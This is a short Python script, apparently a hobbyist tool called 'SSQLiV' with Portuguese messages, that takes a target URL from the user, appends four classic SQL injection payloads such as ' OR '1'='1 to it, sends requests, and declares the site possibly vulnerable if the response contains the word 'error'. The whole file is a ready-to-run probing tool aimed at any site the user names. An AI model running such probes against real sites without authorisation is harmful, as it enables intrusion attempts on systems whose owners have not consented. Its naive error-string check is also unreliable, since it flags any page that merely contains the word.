import requests
import time

# Função para verificar se um site é vulnerável a SQL Injection
def check_sql_injection(url):
    payloads = ["' OR '1'='1", "' OR '1'='1'--", '" OR "1"="1', '" OR "1"="1"--']

    for payload in payloads:
        modified_url = url + payload
        response = requests.get(modified_url)

        if "error" in response.text.lower():
            print("╔════════════════════════════════════════════╗")
            print("║ POSSIVELMENTE Vulnerável A INJEÇÃO SQL     ║")
            print("╚════════════════════════════════════════════╝")
            break

    else:
        print("╔════════════════════════════════════════════╗")
        print("║ POSSIVELMENTE NÃO Vulnerável A INJE. SQL   ║")
        print("╚════════════════════════════════════════════╝")

    time.sleep(1)  # Intervalo de 1 segundo após a resposta

# Arte ASCII
ascii_art = """
   __________ ____    __    _ _    __
  / ___/ ___// __ \  / /   (_) |  / /
   \__ \\__ \/ / / / / /   / /| | / / 
 ___/ /__/ / /_/ / / /___/ / | |/ /  
/____/____/\___\_\/_____/_/  |___/   v1.
                                     
  "SIMPLE SQL Injection VERIFY v1."
"""

print(ascii_art)
print("SSQLiV Iniciando..")
print("Digite a URL do site para verificar.")
print("Exemplo: http://www.example.com")

# Solicitar a URL do site ao usuário
site_url = input("URL do Alvo: ")

# Verificar se o site é vulnerável a SQL Injection
check_sql_injection(site_url)
